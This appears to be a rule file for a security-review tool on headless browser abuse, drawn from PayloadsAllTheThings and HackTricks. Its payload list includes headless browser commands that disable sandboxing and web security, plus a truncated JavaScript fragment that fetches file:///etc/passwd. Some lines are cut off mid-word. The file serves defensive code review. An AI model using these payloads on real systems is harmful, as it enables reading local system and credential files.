# Headless Browser Abuse — @phantomx skill
> cats: (advisory — no static taint rule yet) · severity: low
> sources: PayloadsAllTheThings, HackTricks

## What it is
Example of headless browsers commands:

## Exploit payloads (from PayloadsAllTheThings)
- `google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com`
- `firefox --screenshot https://www.google.com`
- `"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --window-siz`
- `google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run --disable-web-security`
- `<script>`
- `async function getFlag(){`
- `response = await fetch("file:///etc/passwd");`
- `flag = await response.text();`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Headless%20Browser
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=Headless%20Browser%20Abuse
- HackTricks Cloud: https://cloud.hacktricks.wiki/
